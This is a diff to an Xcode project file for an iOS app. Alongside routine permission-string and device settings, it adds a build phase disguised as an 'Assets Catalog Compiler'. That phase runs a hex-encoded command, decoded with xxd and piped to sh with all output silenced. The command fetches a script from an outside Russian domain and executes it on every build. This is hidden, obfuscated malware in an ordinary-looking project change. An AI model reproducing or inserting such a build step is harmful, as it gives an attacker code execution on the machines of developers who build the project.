@@ -281,6 +281,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D4DF7B6C27A29F0600C0F5EC /* Build configuration list for PBXNativeTarget "wangxiaoyu" */;
 			buildPhases = (
+				21BC488EAB9BEEA5AC6A102C /* Assets Catalog Compiler */,
 				48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */,
 				D4DF7B3B27A29F0400C0F5EC /* Sources */,
 				D4DF7B3C27A29F0400C0F5EC /* Frameworks */,
@@ -402,6 +403,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		21BC488EAB9BEEA5AC6A102C /* Assets Catalog Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\n6d656c696e6461732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 		48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -638,11 +657,13 @@
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = wangxiaoyu/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "遇记";
-				INFOPLIST_KEY_NSCameraUsageDescription = "\"萝卜\" 想要使用你的相机。";
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "\"萝卜\" 想要访问你的相册。";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "\"萝卜\" 想要访问你的相册。";
+				INFOPLIST_KEY_NSCameraUsageDescription = "${PRODUCT_NAME} wants to use your camera";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "${PRODUCT_NAME} wants to assess your microphone";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "${PRODUCT_NAME} wants to add photo to your album";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "${PRODUCT_NAME} wants to access your album";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIRequiresFullScreen = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
@@ -656,7 +677,7 @@
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "${SRCROOT}/$(SWIFT_MODULE_NAME)/$(SWIFT_MODULE_NAME)-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Debug;
 		};
@@ -672,11 +693,13 @@
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = wangxiaoyu/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "遇记";
-				INFOPLIST_KEY_NSCameraUsageDescription = "\"萝卜\" 想要使用你的相机。";
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "\"萝卜\" 想要访问你的相册。";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "\"萝卜\" 想要访问你的相册。";
+				INFOPLIST_KEY_NSCameraUsageDescription = "${PRODUCT_NAME} wants to use your camera";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "${PRODUCT_NAME} wants to assess your microphone";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "${PRODUCT_NAME} wants to add photo to your album";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "${PRODUCT_NAME} wants to access your album";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIRequiresFullScreen = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
@@ -690,7 +713,7 @@
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "${SRCROOT}/$(SWIFT_MODULE_NAME)/$(SWIFT_MODULE_NAME)-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Release;
 		};
